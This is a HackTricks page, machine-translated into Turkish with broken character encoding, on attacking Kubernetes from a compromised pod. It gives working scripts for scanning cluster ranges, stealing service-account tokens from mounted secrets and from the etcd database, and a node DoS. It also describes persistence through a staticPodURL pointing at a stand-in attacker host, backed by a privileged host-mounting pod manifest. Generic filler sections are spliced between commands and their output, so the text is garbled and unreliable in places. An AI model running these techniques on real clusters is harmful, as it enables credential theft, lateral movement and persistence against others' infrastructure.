# Bir Pod Ä°Ã§erisinden Kubernetes'e SaldÄ±rma

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin!</summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzdaki Ã¶zel [**NFT'leri**](https://opensea.io/collection/the-peass-family) keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)'u **takip edin**.
* **Hacking hilelerinizi paylaÅŸarak** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶nderin**.

</details>

## **Pod KaÃ§Ä±ÅŸÄ±**

**ÅanslÄ±ysanÄ±z, ondan dÃ¼ÄŸÃ¼me kaÃ§mayÄ± baÅŸarabilirsiniz:**

![](https://sickrov.github.io/media/Screenshot-161.jpg)

### Pod'dan KaÃ§ma

Pod'dan kaÃ§maya Ã§alÄ±ÅŸmak iÃ§in Ã¶nce **ayrÄ±calÄ±klarÄ± yÃ¼kseltmeniz** gerekebilir, bunu yapmak iÃ§in bazÄ± teknikler:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" %}

Kompromize ettiÄŸiniz bir pod'dan kaÃ§mak iÃ§in bu **docker kaÃ§Ä±ÅŸlarÄ±nÄ± kontrol edebilirsiniz**:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout" %}

### Kubernetes AyrÄ±calÄ±klarÄ±nÄ±n KÃ¶tÃ¼ye KullanÄ±lmasÄ±

**Kubernetes numaralandÄ±rmasÄ±** bÃ¶lÃ¼mÃ¼nde aÃ§Ä±klandÄ±ÄŸÄ± gibi:

{% content-ref url="kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](kubernetes-enumeration.md)
{% endcontent-ref %}

Genellikle pod'lar iÃ§erisinde bir **hizmet hesabÄ± belirteci** Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r. Bu hizmet hesabÄ±, kÃ¼me iÃ§inde yapÄ±landÄ±rÄ±lmÄ±ÅŸ dÃ¼ÄŸÃ¼mlere **geÃ§mek** veya hatta **kaÃ§mak** iÃ§in **kÃ¶tÃ¼ye kullanabileceÄŸiniz bazÄ± ayrÄ±calÄ±klara sahip olabilir**. NasÄ±l yapÄ±lacaÄŸÄ±nÄ± kontrol edin:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### Bulut AyrÄ±calÄ±klarÄ±nÄ±n KÃ¶tÃ¼ye KullanÄ±lmasÄ±

EÄŸer pod bir **bulut ortamÄ±nda** Ã§alÄ±ÅŸtÄ±rÄ±lÄ±yorsa, **metadata uÃ§ noktasÄ±ndan bir belirteÃ§ sÄ±zdÄ±rabilir** ve bunu kullanarak ayrÄ±calÄ±klarÄ± yÃ¼kseltebilirsiniz.

## ZayÄ±f AÄŸ Hizmetlerini AraÅŸtÄ±rma

Kubernetes ortamÄ±nda olduÄŸunuz iÃ§in, mevcut pod ayrÄ±calÄ±klarÄ±nÄ± kÃ¶tÃ¼ye kullanarak ayrÄ±calÄ±klarÄ± yÃ¼kseltemiyorsanÄ±z ve konteynerden kaÃ§amÄ±yorsanÄ±z, **potansiyel olarak zayÄ±f hizmetleri araÅŸtÄ±rmalÄ±sÄ±nÄ±z**.

### Hizmetler

**Bu amaÃ§la, kubernetes ortamÄ±nÄ±n tÃ¼m hizmetlerini almayÄ± deneyebilirsiniz:**
```
kubectl get svc --all-namespaces
```
VarsayÄ±lan olarak, Kubernetes dÃ¼z bir aÄŸ ÅŸemasÄ± kullanÄ±r, bu da demektir ki **kÃ¼me iÃ§indeki herhangi bir pod/hizmet diÄŸerleriyle iletiÅŸim kurabilir**. KÃ¼me iÃ§indeki **ad alanlarÄ± varsayÄ±lan olarak herhangi bir aÄŸ gÃ¼venliÄŸi kÄ±sÄ±tlamasÄ±na sahip deÄŸildir**. Ad alanÄ±ndaki herhangi biri diÄŸer ad alanlarÄ±yla iletiÅŸim kurabilir.

### Tarama

AÅŸaÄŸÄ±daki Bash komut dosyasÄ± (bir [Kubernetes atÃ¶lyesinden](https://github.com/calinah/learn-by-hacking-kccn/blob/master/k8s\_cheatsheet.md) alÄ±nmÄ±ÅŸtÄ±r) kubernetes kÃ¼mesinin IP aralÄ±klarÄ±nÄ± yÃ¼kleyip tarayacaktÄ±r:
```bash
sudo apt-get update
sudo apt-get install nmap
nmap-kube ()
{
nmap --open -T4 -A -v -Pn -p 80,443,2379,8080,9090,9100,9093,4001,6782-6784,6443,8443,9099,10250,10255,10256 "${@}"
}

nmap-kube-discover () {
local LOCAL_RANGE=$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,');
local SERVER_RANGES=" ";
SERVER_RANGES+="10.0.0.1 ";
SERVER_RANGES+="10.0.1.* ";
SERVER_RANGES+="10.*.0-1.* ";
nmap-kube ${SERVER_RANGES} "${LOCAL_RANGE}"
}
nmap-kube-discover
```
AÅŸaÄŸÄ±daki sayfayÄ± inceleyerek, Kubernetes Ã¶zel hizmetlerine saldÄ±rarak diÄŸer podlarÄ±/tÃ¼m ortamÄ± tehlikeye atabileceÄŸinizi Ã¶ÄŸrenebilirsiniz:

{% content-ref url="pentesting-kubernetes-services.md" %}
[pentesting-kubernetes-services.md](pentesting-kubernetes-services.md)
{% endcontent-ref %}

### Sniffing

EÄŸer **tehlikedeki pod** baÅŸka podlarÄ±n kimlik doÄŸrulamasÄ± iÃ§in kullanÄ±lan hassas bir hizmet Ã§alÄ±ÅŸtÄ±rÄ±yorsa, yerel iletiÅŸimi **dinleyerek diÄŸer podlardan gÃ¶nderilen kimlik bilgilerini elde edebilirsiniz**.

## Network Spoofing

VarsayÄ±lan olarak, **ARP spoofing** (ve buna baÄŸlÄ± olarak **DNS Spoofing**) gibi teknikler Kubernetes aÄŸÄ±nda Ã§alÄ±ÅŸÄ±r. ArdÄ±ndan, bir pod iÃ§inde, varsayÄ±lan olarak **NET\_RAW yeteneÄŸine** sahipseniz, Ã¶zel olarak oluÅŸturulmuÅŸ aÄŸ paketleri gÃ¶nderebilir ve **aynÄ± dÃ¼ÄŸÃ¼mde Ã§alÄ±ÅŸan tÃ¼m podlara ARP Spoofing aracÄ±lÄ±ÄŸÄ±yla MitM saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtirebilirsiniz.**\
DahasÄ±, **zararlÄ± pod** DNS Sunucusu ile **aynÄ± dÃ¼ÄŸÃ¼mde Ã§alÄ±ÅŸÄ±yorsa**, kÃ¼me iÃ§indeki tÃ¼m podlara **DNS Spoofing saldÄ±rÄ±sÄ± gerÃ§ekleÅŸtirebilirsiniz**.

{% content-ref url="kubernetes-network-attacks.md" %}
[kubernetes-network-attacks.md](kubernetes-network-attacks.md)
{% endcontent-ref %}

## Node DoS

Kubernetes belgelerinde kaynaklar iÃ§in bir spesifikasyon ve konteynerler iÃ§in **uygulanmÄ±ÅŸ sÄ±nÄ±rlar** bulunmamaktadÄ±r. Bir saldÄ±rgan olarak, **pod/deployment'Ä±n Ã§alÄ±ÅŸtÄ±ÄŸÄ± kaynaklarÄ± tÃ¼ketebilir** ve diÄŸer kaynaklarÄ± aÃ§ bÄ±rakarak ortamda bir DoS durumuna neden olabilirsiniz.

Bu, [**stress-ng**](https://zoomadmin.com/HowToInstall/UbuntuPackage/stress-ng) gibi bir araÃ§la yapÄ±labilir:
```
stress-ng --vm 2 --vm-bytes 2G --timeout 30s
```
`stress-ng` Ã§alÄ±ÅŸÄ±rken ve sonrasÄ±nda farkÄ± gÃ¶rebilirsiniz.
```bash
kubectl --namespace big-monolith top pod hunger-check-deployment-xxxxxxxxxx-xxxxx
```
## Node SonrasÄ± SÄ±zma

EÄŸer **konteynÄ±rdan kaÃ§mayÄ±** baÅŸardÄ±ysanÄ±z, dÃ¼ÄŸÃ¼mde aÅŸaÄŸÄ±daki ilginÃ§ ÅŸeyleri bulabilirsiniz:

* **Konteyner Ã‡alÄ±ÅŸma ZamanÄ±** iÅŸlemi (Docker)
* Bu gibi birini istismar edebileceÄŸiniz dÃ¼ÄŸÃ¼mde Ã§alÄ±ÅŸan daha fazla **pods/konteyner** (daha fazla token)
* TÃ¼m **dosya sistemi** ve **iÅŸletim sistemi** genel olarak
* Dinleyen **Kube-Proxy** servisi
* Dinleyen **Kubelet** servisi. YapÄ±landÄ±rma dosyalarÄ±nÄ± kontrol edin:
* Dizin: `/var/lib/kubelet/`
* `/var/lib/kubelet/kubeconfig`
* `/var/lib/kubelet/kubelet.conf`
* `/var/lib/kubelet/config.yaml`
* `/var/lib/kubelet/kubeadm-flags.env`
* `/etc/kubernetes/kubelet-kubeconfig`
* DiÄŸer **kubernetes ortak dosyalarÄ±**:
* `$HOME/.kube/config` - **KullanÄ±cÄ± YapÄ±landÄ±rmasÄ±**
* `/etc/kubernetes/kubelet.conf`- **Normal YapÄ±landÄ±rma**
* `/etc/kubernetes/bootstrap-kubelet.conf` - **Ã–nyÃ¼kleme YapÄ±landÄ±rmasÄ±**
* `/etc/kubernetes/manifests/etcd.yaml` - **etcd YapÄ±landÄ±rmasÄ±**
* `/etc/kubernetes/pki` - **Kubernetes AnahtarÄ±**

### DÃ¼ÄŸÃ¼m kubeconfig DosyasÄ±nÄ± Bulma

Ã–nceden yorumlanan yollardan birinde kubeconfig dosyasÄ±nÄ± bulamazsanÄ±z, kubelet iÅŸleminin `--kubeconfig` argÃ¼manÄ±nÄ± kontrol edin:
```
ps -ef | grep kubelet
root        1406       1  9 11:55 ?        00:34:57 kubelet --cloud-provider=aws --cni-bin-dir=/opt/cni/bin --cni-conf-dir=/etc/cni/net.d --config=/etc/kubernetes/kubelet-conf.json --exit-on-lock-contention --kubeconfig=/etc/kubernetes/kubelet-kubeconfig --lock-file=/var/run/lock/kubelet.lock --network-plugin=cni --container-runtime docker --node-labels=node.kubernetes.io/role=k8sworker --volume-plugin-dir=/var/lib/kubelet/volumeplugin --node-ip 10.1.1.1 --hostname-override ip-1-1-1-1.eu-west-2.compute.internal
```
### SÄ±rlarÄ± Ã‡alma

Bir Kubernetes podu iÃ§erisinden sÄ±rlarÄ± Ã§almak iÃ§in aÅŸaÄŸÄ±daki yÃ¶ntemleri kullanabilirsiniz:

1. **Environment Variables (Ã‡evresel DeÄŸiÅŸkenler):** Pod iÃ§erisindeki Ã§evresel deÄŸiÅŸkenler, sÄ±rlarÄ±n depolanabileceÄŸi bir kaynaktÄ±r. `env` komutunu kullanarak bu deÄŸiÅŸkenleri kontrol edebilirsiniz.

2. **Mounted Volumes (BaÄŸlanmÄ±ÅŸ Birimler):** Pod iÃ§erisindeki birimler, sÄ±rlarÄ±n depolanabileceÄŸi bir baÅŸka yerdir. `mount` komutunu kullanarak bu birimleri kontrol edebilirsiniz.

3. **API Ä°stekleri:** Pod iÃ§erisinde Ã§alÄ±ÅŸan uygulamalar, dÄ±ÅŸarÄ±ya API istekleri yapabilir. Bu isteklerde sÄ±rlarÄ±n yer alabileceÄŸi bir header veya body olabilir. `curl` veya `wget` gibi araÃ§larÄ± kullanarak bu istekleri kontrol edebilirsiniz.

4. **Log DosyalarÄ±:** Pod iÃ§erisinde Ã§alÄ±ÅŸan uygulamalarÄ±n log dosyalarÄ±, sÄ±rlarÄ±n yazÄ±ldÄ±ÄŸÄ± bir baÅŸka kaynaktÄ±r. `cat` veya `tail` komutlarÄ±yla bu log dosyalarÄ±nÄ± kontrol edebilirsiniz.

5. **Prosesler:** Pod iÃ§erisinde Ã§alÄ±ÅŸan prosesler, sÄ±rlarÄ±n bellekte tutulduÄŸu bir baÅŸka yerdir. `ps` veya `top` komutlarÄ±yla bu prosesleri kontrol edebilirsiniz.

Bu yÃ¶ntemleri kullanarak Kubernetes podu iÃ§erisinden sÄ±rlarÄ± Ã§alabilirsiniz. Ancak, bu iÅŸlemleri gerÃ§ekleÅŸtirirken yasalara ve etik kurallara uymayÄ± unutmayÄ±n.
```bash
# Check Kubelet privileges
kubectl --kubeconfig /var/lib/kubelet/kubeconfig auth can-i create pod -n kube-system

# Steal the tokens from the pods running in the node
# The most interesting one is probably the one of kube-system
ALREADY="IinItialVaaluE"
for i in $(mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p'); do
TOKEN=$(cat $(echo $i | sed 's/.namespace$/\/token/'))
if ! [ $(echo $TOKEN | grep -E $ALREADY) ]; then
ALREADY="$ALREADY|$TOKEN"
echo "Directory: $i"
echo "Namespace: $(cat $i)"
echo ""
echo $TOKEN
echo "================================================================================"
echo ""
fi
done
```
Betik [**can-they.sh**](https://github.com/BishopFox/badPods/blob/main/scripts/can-they.sh), sizin yerinize diÄŸer podlarÄ±n tokenlerini alacak ve aradÄ±ÄŸÄ±nÄ±z izne sahip olup olmadÄ±klarÄ±nÄ± kontrol edecektir (1'er 1'er bakmak yerine).
```bash
./can-they.sh -i "--list -n default"
./can-they.sh -i "list secrets -n kube-system"// Some code
```
### AyrÄ±calÄ±klÄ± DaemonSetler

Bir DaemonSet, **kÃ¼menin tÃ¼m dÃ¼ÄŸÃ¼mlerinde Ã§alÄ±ÅŸacak bir pod** dur. Bu nedenle, bir DaemonSet, **ayrÄ±calÄ±klÄ± bir hizmet hesabÄ±yla yapÄ±landÄ±rÄ±lmÄ±ÅŸsa**, **tÃ¼m dÃ¼ÄŸÃ¼mlerde** o **ayrÄ±calÄ±klÄ± hizmet hesabÄ±nÄ±n belirteci** ni bulabilir ve bunu kÃ¶tÃ¼ye kullanabilirsiniz.

SaldÄ±rÄ±, Ã¶nceki bÃ¶lÃ¼mdekiyle aynÄ±dÄ±r, ancak ÅŸimdi ÅŸansa baÄŸlÄ± deÄŸilsiniz.

### Buluta GeÃ§iÅŸ

EÄŸer kÃ¼me bir bulut hizmeti tarafÄ±ndan yÃ¶netiliyorsa, genellikle **DÃ¼ÄŸÃ¼mÃ¼n Pod'dan farklÄ± bir eriÅŸimi olacaktÄ±r**. Bu nedenle, **dÃ¼ÄŸÃ¼mden metadata uÃ§ noktasÄ±na eriÅŸmeyi deneyin** (veya hostNetwork'e True olarak ayarlanmÄ±ÅŸ bir poddan):

{% content-ref url="kubernetes-pivoting-to-clouds.md" %}
[kubernetes-pivoting-to-clouds.md](kubernetes-pivoting-to-clouds.md)
{% endcontent-ref %}

### etcd'yi Ã‡alma

EÄŸer konteynerÄ± Ã§alÄ±ÅŸtÄ±racak olan DÃ¼ÄŸÃ¼mÃ¼n [**nodeName**](https://kubernetes.io/docs/tasks/configure-pod-container/assign-pods-nodes/#create-a-pod-that-gets-scheduled-to-specific-node) 'unu belirtebiliyorsanÄ±z, bir kontrol dÃ¼ÄŸÃ¼mÃ¼ dÃ¼ÄŸÃ¼mÃ¼nde kabuk alÄ±n ve **etcd veritabanÄ±nÄ±** alÄ±n:
```
kubectl get nodes
NAME                STATUS   ROLES    AGE   VERSION
k8s-control-plane   Ready    master   93d   v1.19.1
k8s-worker          Ready    <none>   93d   v1.19.1
```
Kontrol dÃ¼ÄŸÃ¼mleri, **ana bilgisayar rolÃ¼ne** sahiptir ve **bulut yÃ¶netimli kÃ¼meleme sistemlerinde bunlarda herhangi bir ÅŸey Ã§alÄ±ÅŸtÄ±ramazsÄ±nÄ±z**.

#### Etcd'den sÄ±rlarÄ± okuyun

Pod spesifikasyonunda `nodeName` seÃ§icisini kullanarak podunuzu bir kontrol dÃ¼ÄŸÃ¼mÃ¼ dÃ¼ÄŸÃ¼mÃ¼nde Ã§alÄ±ÅŸtÄ±rabilirseniz, tÃ¼m yapÄ±landÄ±rmalarÄ± ve sÄ±rlarÄ± iÃ§eren `etcd` veritabanÄ±na kolayca eriÅŸebilirsiniz.

AÅŸaÄŸÄ±da, Ã¼zerinde bulunduÄŸunuz kontrol dÃ¼ÄŸÃ¼mÃ¼nde `etcd` Ã§alÄ±ÅŸÄ±yorsa sÄ±rlarÄ± almanÄ±n hÄ±zlÄ± ve basit bir yolunu bulabilirsiniz. EÄŸer `etcd` istemci aracÄ± `etcdctl` ile bir pod oluÅŸturup, nerede Ã§alÄ±ÅŸÄ±yor olursa olsun etcd'ye baÄŸlanmak iÃ§in kontrol dÃ¼ÄŸÃ¼mÃ¼ dÃ¼ÄŸÃ¼mÃ¼nÃ¼n kimlik bilgilerini kullanan daha zarif bir Ã§Ã¶zÃ¼m isterseniz, @mauilion'un [bu Ã¶rnek manifestosuna](https://github.com/mauilion/blackhat-2019/blob/master/etcd-attack/etcdclient.yaml) gÃ¶z atabilirsiniz.

**Kontrol dÃ¼ÄŸÃ¼mÃ¼nde `etcd`'nin Ã§alÄ±ÅŸÄ±p Ã§alÄ±ÅŸmadÄ±ÄŸÄ±nÄ± ve veritabanÄ±nÄ±n nerede olduÄŸunu kontrol edin (Bu, `kubeadm` tarafÄ±ndan oluÅŸturulan bir kÃ¼me Ã¼zerinde gerÃ§ekleÅŸtirilir)**
```
root@k8s-control-plane:/var/lib/etcd/member/wal# ps -ef | grep etcd | sed s/\-\-/\\n/g | grep data-dir
```
# Kubernetes Ä°Ã§erisinden Bir Pod Ãœzerinden SaldÄ±rma

Bu bÃ¶lÃ¼mde, bir Kubernetes kÃ¼mesinde Ã§alÄ±ÅŸan bir pod iÃ§erisinden nasÄ±l saldÄ±rÄ± gerÃ§ekleÅŸtirileceÄŸini Ã¶ÄŸreneceksiniz. Bu saldÄ±rÄ± senaryosunda, bir pod iÃ§erisinde Ã§alÄ±ÅŸan bir saldÄ±rganÄ±n, aynÄ± kÃ¼medeki diÄŸer podlara veya Kubernetes kaynaklarÄ±na eriÅŸim saÄŸlamasÄ± hedeflenmektedir.

## AdÄ±m 1: Pod Ä°Ã§erisindeki AÄŸa EriÅŸim

SaldÄ±rgan, hedef pod iÃ§erisinde Ã§alÄ±ÅŸan bir konteynerde bulunmaktadÄ±r. Ä°lk adÄ±mda, saldÄ±rganÄ±n hedef pod iÃ§erisindeki aÄŸa eriÅŸim saÄŸlamasÄ± gerekmektedir. Bu, saldÄ±rganÄ±n hedef pod iÃ§erisindeki bir konteynerde bir kabuk aÃ§masÄ± veya bir saldÄ±rÄ± aracÄ± Ã§alÄ±ÅŸtÄ±rmasÄ± ile gerÃ§ekleÅŸtirilebilir.

## AdÄ±m 2: Pod Ä°Ã§erisindeki DiÄŸer Podlara EriÅŸim

SaldÄ±rgan, hedef pod iÃ§erisindeki aÄŸa eriÅŸim saÄŸladÄ±ktan sonra, aynÄ± kÃ¼medeki diÄŸer podlara eriÅŸim saÄŸlamak iÃ§in Ã§eÅŸitli yÃ¶ntemler kullanabilir. Ã–rneÄŸin, saldÄ±rgan, hedef pod iÃ§erisinde Ã§alÄ±ÅŸan bir konteynerdeki aÄŸ arayÃ¼zÃ¼nÃ¼ kullanarak diÄŸer podlara doÄŸrudan eriÅŸebilir veya hedef pod iÃ§erisinde Ã§alÄ±ÅŸan bir saldÄ±rÄ± aracÄ± kullanarak diÄŸer podlara saldÄ±rabilir.

## AdÄ±m 3: Kubernetes KaynaklarÄ±na EriÅŸim

SaldÄ±rgan, hedef pod iÃ§erisindeki diÄŸer podlara eriÅŸim saÄŸladÄ±ktan sonra, Kubernetes kÃ¼mesindeki diÄŸer kaynaklara eriÅŸim saÄŸlamak iÃ§in Ã§eÅŸitli yÃ¶ntemler kullanabilir. Ã–rneÄŸin, saldÄ±rgan, hedef pod iÃ§erisinde Ã§alÄ±ÅŸan bir konteynerdeki Kubernetes API'sini kullanarak diÄŸer kaynaklara eriÅŸebilir veya hedef pod iÃ§erisinde Ã§alÄ±ÅŸan bir saldÄ±rÄ± aracÄ± kullanarak Kubernetes kaynaklarÄ±na saldÄ±rabilir.

Bu saldÄ±rÄ± senaryosunda, saldÄ±rganÄ±n hedef pod iÃ§erisindeki aÄŸa eriÅŸim saÄŸlamasÄ± ve ardÄ±ndan diÄŸer podlara ve Kubernetes kaynaklarÄ±na eriÅŸim saÄŸlamasÄ± hedeflenmektedir. Bu nedenle, Kubernetes kÃ¼mesinin gÃ¼venliÄŸini saÄŸlamak iÃ§in gerekli Ã¶nlemlerin alÄ±nmasÄ± Ã¶nemlidir.
```bash
data-dir=/var/lib/etcd
```
**etcd veritabanÄ±ndaki verileri gÃ¶rÃ¼ntÃ¼leme:**
```bash
strings /var/lib/etcd/member/snap/db | less
```
**VeritabanÄ±ndan tokenlarÄ± Ã§Ä±karÄ±n ve hizmet hesabÄ± adÄ±nÄ± gÃ¶sterin**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
```
**AynÄ± komut, ancak sadece kube-system ad alanÄ±ndaki varsayÄ±lan belirteciyi dÃ¶ndÃ¼ren bazÄ± grepler**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done | grep kube-system | grep default
```
# Kubernetes Ä°Ã§erisinden Bir Pod Ãœzerinden SaldÄ±rÄ±

Bu bÃ¶lÃ¼mde, bir Kubernetes kÃ¼mesinde bir pod iÃ§erisinden saldÄ±rÄ± gerÃ§ekleÅŸtirmek iÃ§in kullanÄ±labilecek bazÄ± teknikler hakkÄ±nda bilgi verilecektir.

## 1. Pod Ä°Ã§erisindeki DiÄŸer Pod'lara EriÅŸim

Bir pod iÃ§erisinde Ã§alÄ±ÅŸan bir saldÄ±rgan, aynÄ± kÃ¼medeki diÄŸer pod'lara eriÅŸebilir. Bu, aÄŸ trafiÄŸini dinleyerek veya pod iÃ§erisindeki bir araÃ§ kullanarak gerÃ§ekleÅŸtirilebilir. SaldÄ±rgan, bu ÅŸekilde diÄŸer pod'lara saldÄ±rabilir veya hassas verilere eriÅŸebilir.

## 2. Pod Ä°Ã§erisindeki Hizmetlerin SÃ¶mÃ¼rÃ¼lmesi

Bir pod iÃ§erisinde Ã§alÄ±ÅŸan bir saldÄ±rgan, pod iÃ§erisindeki hizmetleri sÃ¶mÃ¼rebilir. Bu, hizmetlerin zayÄ±f noktalarÄ±nÄ± veya gÃ¼venlik aÃ§Ä±klarÄ±nÄ± kullanarak gerÃ§ekleÅŸtirilebilir. SaldÄ±rgan, bu ÅŸekilde hizmetleri etkisiz hale getirebilir veya yetkisiz eriÅŸim elde edebilir.

## 3. Pod Ä°Ã§erisindeki Ä°ÅŸlemlerin Ä°zlenmesi

Bir pod iÃ§erisinde Ã§alÄ±ÅŸan bir saldÄ±rgan, pod iÃ§erisindeki iÅŸlemleri izleyebilir. Bu, pod iÃ§erisindeki bir araÃ§ kullanÄ±larak gerÃ§ekleÅŸtirilebilir. SaldÄ±rgan, bu ÅŸekilde pod iÃ§erisindeki iÅŸlemleri takip edebilir ve hassas verilere eriÅŸebilir.

## 4. Pod Ä°Ã§erisindeki DosyalarÄ±n Ele GeÃ§irilmesi

Bir pod iÃ§erisinde Ã§alÄ±ÅŸan bir saldÄ±rgan, pod iÃ§erisindeki dosyalara eriÅŸebilir ve ele geÃ§irebilir. Bu, pod iÃ§erisindeki bir araÃ§ kullanÄ±larak gerÃ§ekleÅŸtirilebilir. SaldÄ±rgan, bu ÅŸekilde hassas verilere eriÅŸebilir veya dosyalarÄ± deÄŸiÅŸtirebilir.

## 5. Pod Ä°Ã§erisindeki Kimlik Bilgilerinin Ã‡alÄ±nmasÄ±

Bir pod iÃ§erisinde Ã§alÄ±ÅŸan bir saldÄ±rgan, pod iÃ§erisindeki kimlik bilgilerini Ã§alabilir. Bu, pod iÃ§erisindeki bir araÃ§ kullanÄ±larak gerÃ§ekleÅŸtirilebilir. SaldÄ±rgan, bu ÅŸekilde kimlik bilgilerini ele geÃ§irebilir ve yetkisiz eriÅŸim elde edebilir.

## 6. Pod Ä°Ã§erisindeki GÃ¼venlik AyarlarÄ±nÄ±n AtlanmasÄ±

Bir pod iÃ§erisinde Ã§alÄ±ÅŸan bir saldÄ±rgan, pod iÃ§erisindeki gÃ¼venlik ayarlarÄ±nÄ± atlatabilir. Bu, pod iÃ§erisindeki bir araÃ§ kullanÄ±larak veya hizmetlerin zayÄ±f noktalarÄ±nÄ± kullanarak gerÃ§ekleÅŸtirilebilir. SaldÄ±rgan, bu ÅŸekilde pod iÃ§erisindeki gÃ¼venlik Ã¶nlemlerini atlayabilir ve yetkisiz eriÅŸim elde edebilir.

Bu teknikler, bir pod iÃ§erisinden Kubernetes kÃ¼mesindeki diÄŸer bileÅŸenlere saldÄ±rÄ± gerÃ§ekleÅŸtirmek iÃ§in kullanÄ±labilir. SaldÄ±rganlar, bu teknikleri kullanarak hassas verilere eriÅŸebilir, hizmetleri etkisiz hale getirebilir veya yetkisiz eriÅŸim elde edebilir. Bu nedenle, Kubernetes kÃ¼mesinin gÃ¼venliÄŸini saÄŸlamak iÃ§in bu tÃ¼r saldÄ±rÄ±lara karÅŸÄ± Ã¶nlemler alÄ±nmalÄ±dÄ±r.
```
1/registry/secrets/kube-system/default-token-d82kb | eyJhbGciOiJSUzI1NiIsImtpZCI6IkplRTc0X2ZP[REDACTED]
```
### Statik/AynalÄ± Pod KalÄ±cÄ±lÄ±ÄŸÄ±

Statik Pod'lar, API sunucusunun onlarÄ± gÃ¶zlemlememesi durumunda belirli bir dÃ¼ÄŸÃ¼mde kubelet daemon tarafÄ±ndan doÄŸrudan yÃ¶netilen Pod'lardÄ±r. Kontrol dÃ¼zlemi tarafÄ±ndan yÃ¶netilen Pod'lar (Ã¶rneÄŸin, bir DaÄŸÄ±tÄ±m); bunun yerine, **kubelet her statik Pod'u izler** (ve baÅŸarÄ±sÄ±z olursa yeniden baÅŸlatÄ±r).

Bu nedenle, statik Pod'lar her zaman belirli bir dÃ¼ÄŸÃ¼mdeki bir Kubelet'e **baÄŸlÄ±dÄ±r**.

**Kubelet otomatik olarak her statik Pod iÃ§in bir ayna Pod oluÅŸturmaya Ã§alÄ±ÅŸÄ±r**. Bu, bir dÃ¼ÄŸÃ¼mde Ã§alÄ±ÅŸan Pod'larÄ±n API sunucusunda gÃ¶rÃ¼nÃ¼r olduÄŸu, ancak oradan kontrol edilemediÄŸi anlamÄ±na gelir. Pod isimleri, bir Ã¶nekli tire ile dÃ¼ÄŸÃ¼m ana bilgisayar adÄ±yla sonlandÄ±rÄ±lÄ±r.

{% hint style="danger" %}
Bir statik Pod'un **`spec`'i diÄŸer API nesnelerine baÅŸvuramaz** (Ã¶rneÄŸin, ServiceAccount, ConfigMap, Secret, vb.). Bu nedenle, mevcut dÃ¼ÄŸÃ¼mdeki kÃ¼me gÃ¼venliÄŸini tehlikeye atmak iÃ§in bir pod'u keyfi bir serviceAccount ile baÅŸlatmak iÃ§in bu davranÄ±ÅŸÄ± istismar edemezsiniz. Ancak, bunu bazÄ± nedenlerle farklÄ± ad alanlarÄ±nda pod'larÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in kullanabilirsiniz.
{% endhint %}

EÄŸer dÃ¼ÄŸÃ¼m ana bilgisayarÄ±nÄ±n iÃ§indeyseniz, **kendisi iÃ§inde bir statik pod oluÅŸturabilirsiniz**. Bu oldukÃ§a kullanÄ±ÅŸlÄ± olabilir Ã§Ã¼nkÃ¼ size **kube-system** gibi farklÄ± bir ad alanÄ±nda bir pod oluÅŸturma imkanÄ± saÄŸlayabilir.

Bir statik pod oluÅŸturmak iÃ§in, [**belgeler bÃ¼yÃ¼k bir yardÄ±mcÄ±dÄ±r**](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/). Temel olarak 2 ÅŸeye ihtiyacÄ±nÄ±z vardÄ±r:

* **kubelet servisinde** veya **kubelet yapÄ±landÄ±rmasÄ±nda** (**staticPodPath** olarak bilinen) **`--pod-manifest-path=/etc/kubernetes/manifests`** parametresini yapÄ±landÄ±rÄ±n ve servisi yeniden baÅŸlatÄ±n
* **pod tanÄ±mÄ±nÄ±** **`/etc/kubernetes/manifests`** iÃ§inde oluÅŸturun

**Daha gizli bir yol ise:**

* **kubelet** yapÄ±landÄ±rma dosyasÄ±ndaki **`staticPodURL`** parametresini deÄŸiÅŸtirin ve `staticPodURL: http://saldÄ±rgan.com:8765/pod.yaml` gibi bir ÅŸey ayarlayÄ±n. Bu, kubelet iÅŸleminin, belirtilen URL'den **yapÄ±landÄ±rmayÄ± alarak bir statik pod oluÅŸturmasÄ±nÄ± saÄŸlar**.

**Ã–rnek** olarak, [**buradan**](https://research.nccgroup.com/2020/02/12/command-and-kubectl-talk-follow-up/) alÄ±nan **kube-system** iÃ§inde bir ayrÄ±calÄ±k podu oluÅŸturmak iÃ§in **pod** yapÄ±landÄ±rmasÄ±:
```yaml
apiVersion: v1
kind: Pod
metadata:
name: bad-priv2
namespace: kube-system
spec:
containers:
- name: bad
hostPID: true
image: gcr.io/shmoocon-talk-hacking/brick
stdin: true
tty: true
imagePullPolicy: IfNotPresent
volumeMounts:
- mountPath: /chroot
name: host
securityContext:
privileged: true
